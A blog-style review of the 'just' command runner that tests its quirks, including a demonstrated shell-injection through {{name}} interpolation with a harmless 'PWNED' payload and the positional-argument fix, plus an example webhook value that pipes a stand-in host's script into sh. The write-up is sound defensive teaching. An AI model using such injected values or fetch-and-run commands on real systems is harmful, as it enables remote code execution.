---
title: "just: the make replacement that runs every recipe line in a fresh shell"
description: "An honest, stress-tested review of just, the command runner. The per-line shell, the whole-file validation, and the interpolation that runs your argument."
date: 2026-09-03
categories: [Tools]
tags: [productivity, system]
author: edge
preview: /images/previews/just-the-make-replacement-that-runs-every-recipe-l.svg
verdict: "Use it — survives a bad Tuesday. But never feed untrusted input through {{ }}, or it survives the Tuesday the intern has sudo."
excerpt: "I tried to break just the way I break everything: with the input nobody sane would type. The third scenario ran a command I never wrote."
permalink: /tools/just-command-runner-honest-review/
---
I run task runners the way I run everything I review: I hand them the input nobody sane would type and watch what falls off. `just` is the `make` replacement everyone recommends when you complain about `make` — no tab religion, no `.PHONY` bookkeeping, arguments that actually work. The recommendation is correct. It is also incomplete, because two of the things people love about `just` are the two things that will hurt you, and I have the captured output to prove it.

**The verdict, up front:** use it. For "a folder of commands the team keeps re-typing," `just` is better than a pile of shell scripts and much better than a `Makefile` pretending its targets are files. It survives a normal Tuesday and most of a bad one. There is exactly one Tuesday it does not survive — the one where a recipe takes input from someone you don't trust — and I found that one on purpose.

Everything below ran on a fresh Ubuntu 24.04 box against the version `apt` handed me:

```console
$ just --version
just 1.21.0
```

(That's the first honest note, and it's free: `apt install just` gave me `1.21.0`, and upstream ships a good deal faster than your distro does. `just` isn't `fd` — there's no `fdfind`-style rename, the binary really is called `just` — but check `just --version` before you copy a `set`-line off a blog written against a newer release. The distro lag is the tax you pay for not `cargo install`-ing.)

## Gotcha 1: every line is a separate shell (yes, exactly like make)

Here is the recipe everyone writes on day one, and the recipe that teaches everyone the same lesson `make` taught them:

```make
# justfile
cdtest:
    cd /tmp
    pwd

cdtest-fixed:
    cd /tmp && pwd
```

```console
$ just cdtest
cd /tmp
pwd
/tmp/justtest

$ just cdtest-fixed
cd /tmp && pwd
/tmp
```

The `cd /tmp` on its own line did nothing to the `pwd` below it. Each **line** of a recipe is executed in its own shell, so the working directory resets between them — the exact `make` behavior `just` was supposed to save you from. **The failure this prevents:** the deploy recipe that `cd`s into `build/` on line one and runs `rm -rf *` on line two, discovering at 5pm that line two ran in the repo root. Chain with `&&`, or give the recipe a shebang line (`#!/usr/bin/env bash`) so the whole body runs as one script. Don't assume state carries down the lines. It doesn't.

While you're here, note the two lines `just` echoes before each command — `cd /tmp` then the output. That's the default recipe echo (`make` without the `@`). It's fine; I just want you to know the tool is showing you the command, not doubling it.

## Gotcha 2: one typo in a recipe you're not even calling breaks every recipe

This is the one that made me sit up. I had a clean recipe and a broken sibling:

```make
good:
    echo "I am fine"

broken:
    echo "{{TYPO}}"
```

```console
$ just good
error: Variable `TYPO` not defined
 ——▶ justfile:5:13
  │
5 │     echo "{{TYPO}}"
  │             ^^^^
```

I asked for `good`. `good` has no typo. `good` never runs, because `just` parses and validates the **entire** justfile before it will run **any** recipe, and `broken` references a variable that doesn't exist. One `{{TYPO}}` in a recipe nobody called takes down the whole file.

I'll be honest about which way this cuts: it's mostly a **feature**. A `Makefile` will happily run nine targets and blow up on the tenth halfway through a release; `just` refuses to start until the whole file is coherent. But it violates the mental model — "I only touched the `broken` recipe, why is `deploy` failing?" — so when a teammate's half-finished recipe breaks your command, look for an undefined `{{...}}` somewhere you didn't edit. **The failure this prevents:** shipping half a pipeline because target seven had a typo. The failure it *causes*: five minutes of confusion until you learn the rule. Net positive, once.

## Gotcha 3: `{{arg}}` is a string splice, not an argument — and that's an injection

Now the Tuesday `just` does not survive. I do this to every tool that accepts input: I hand it an argument built from a quote, a comment, and a command I'd very much like it not to run.

```make
set positional-arguments

unsafe name:
    echo "hi {{name}}"

safe name:
    echo "hi $1"
```

```console
$ just unsafe 'x"; echo PWNED; touch /tmp/justtest/pwned #'
echo "hi x"; echo PWNED; touch /tmp/justtest/pwned #"
hi x
PWNED
$ ls /tmp/justtest/pwned
/tmp/justtest/pwned
```

There it is. `{{name}}` is **textual substitution into the recipe line before the shell ever sees it.** My argument closed the string with `"`, ran `echo PWNED`, created the file `pwned`, and commented out the trailing quote with `#`. `just` didn't pass my input to a program — it *pasted it into the script and executed the result.* This is `make`'s `$(1)` problem and shell's eval problem wearing a friendlier syntax.

The fix is in the same file. `set positional-arguments` makes recipe arguments available as real shell positionals (`$1`, `$@`), which the shell quotes for you:

```console
$ just safe 'x"; echo PWNED; touch /tmp/justtest/pwned #'
echo "hi $1"
hi x"; echo PWNED; touch /tmp/justtest/pwned #
$ ls /tmp/justtest/pwned
ls: cannot access '/tmp/justtest/pwned': No such file or directory
```

Same hostile input, and now it's just a weird string that got printed. No `PWNED`, no file. **The failure this prevents:** a `just deploy {{branch}}` recipe wired to a webhook, where `branch` is `main; curl evil.sh | sh`. If a recipe ever takes input from anywhere you don't control — a CI variable, an issue title, a form field — reference it as `$1`, never `{{...}}`. `{{ }}` is for values *you* wrote in the justfile. It is not a sanitizer.

I want to be fair: `just` is not doing anything a `Makefile` doesn't. But it *feels* like a modern tool with named parameters and type-checked arity, so people trust `{{name}}` the way they'd trust a function argument. It isn't one.

## The boring passes (publish them anyway)

Not everything broke. The stuff that refused to break earns the grudging respect it's owed:

| Scenario I threw at it | What I hoped for | What happened | |
|---|---|---|---|
| Failing line mid-recipe (`false` between two `echo`s) | Aborts, doesn't barrel on | `error: Recipe abort failed on line 3 with exit code 1`, exit 1 | ✅ |
| Recipe called with too few args (`just greet` on `greet name:`) | Caught before running | `got 0 arguments but takes 1` + a usage line | ✅ |
| Mixed tabs and spaces inside one recipe | Rejected loudly, not silently | `Recipe line has inconsistent leading whitespace` with `␠`/`␉` drawn out | ✅ |
| Run from a nested subdirectory | Finds the justfile | Searches upward like `git`, found it from `deep/deeper/` | ✅ |
| 500 bare invocations of a no-op recipe | Not painfully slow | 1.08s total, ~2.2 ms/call (vs `sh -c true` at ~0.9 ms/call) | ✅ |

The argument-arity check alone is worth the switch from `make`: `just greet` with no argument fails *before* running anything, with a usage line, instead of expanding `$(name)` to the empty string and doing something quietly wrong. The whitespace error is the anti-`make` — it names the offending line and prints the actual invisible characters instead of the legendary `*** missing separator`. And it aborts on the first failing line, so you don't get `make`'s "kept going after the error" surprise. The ~2 ms of startup overhead is nothing for a task runner; if you're calling it 500 times in a loop you've built the wrong thing, and that's on you, not `just`.

## Two more things that will bite you exactly once

**Recipes run from the justfile's directory, not yours.** I ran a `pwd` recipe from `deep/deeper/` and it printed the justfile's directory, not mine. Relative paths in a recipe are relative to the `justfile`, not to where you typed `just`. Usually what you want; occasionally a genuine surprise when a recipe reads `./config` and can't find the one sitting next to *you*.

**`.env` is not loaded by default.** Every other blog post assumes it is:

```console
$ cat .env
SECRET=from_dotenv
$ just env-check          # recipe echoes ${SECRET:-<unset>}
SECRET is: <unset>
```

Add `set dotenv-load` at the top of the justfile and the same recipe prints `SECRET is: from_dotenv`. Until you do, that `.env` sitting right there is decoration. (Newer releases have reshuffled the dotenv settings more than once — another reason to check your version before trusting a `set` line you found online.)

## Who it's for, and who should stay put

Use `just` if you have a `Makefile` whose "targets" are all `.PHONY` verbs — `build`, `test`, `deploy`, `fmt` — because that `Makefile` was lying about being a build system and `just` is honest about being a command runner. The argument handling, the `--list` that turns your `# comments` into a menu, and the loud errors are all real upgrades.

Stay on `make` if your targets are actual **files** with real dependency graphs — `just` deliberately has no `target: prerequisite` timestamp logic, so it will happily rebuild everything every time. And stay on a plain, committed `deploy.sh` if the honest answer is "one script, run start to finish," because a shebang recipe in a justfile is just that script with an extra layer of `{{ }}` waiting to be misused.

**Verdict:** use it — it survives a bad Tuesday, and the errors it throws are the kind that teach instead of taunt. It does **not** survive the Tuesday the intern wires `{{ }}` to a webhook and hands sudo to a stranger with a quotation mark. Keep untrusted input on `$1`, keep your file dependencies on `make`, and `just` earns its place in the folder.

*Reproductions ran on Ubuntu 24.04 with `just 1.21.0` from `apt`. Every console block above is captured output from a command I actually ran; nothing here is a mock-up. The `pwned` file was real, was harmless, and is gone.*
